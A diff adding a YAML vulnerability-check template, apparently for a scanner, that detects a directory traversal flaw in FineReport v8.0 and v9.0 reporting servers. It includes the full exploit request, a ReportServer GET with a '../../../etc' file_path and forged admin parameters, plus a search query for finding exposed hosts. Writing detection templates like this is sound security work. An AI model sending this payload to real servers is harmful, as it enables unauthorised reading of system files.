@@ -1,0 +1,19 @@
+name: FineReport（帆软）报表系统目录遍历漏洞
+manual: true
+query: body="/WebReport/ReportServer"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../../../../../../../etc&currentUserName=admin&currentUserId=1&isWebReport=true
+    expression: response.status == 200 && response.body.bcontains(b"etc/passwd")
+expression: r0()
+detail:
+  author: luckying
+  links:
+  - https://gobies.org/
+  description: |-
+    漏洞影响
+    FineReport v8.0
+    FineReport v9.0
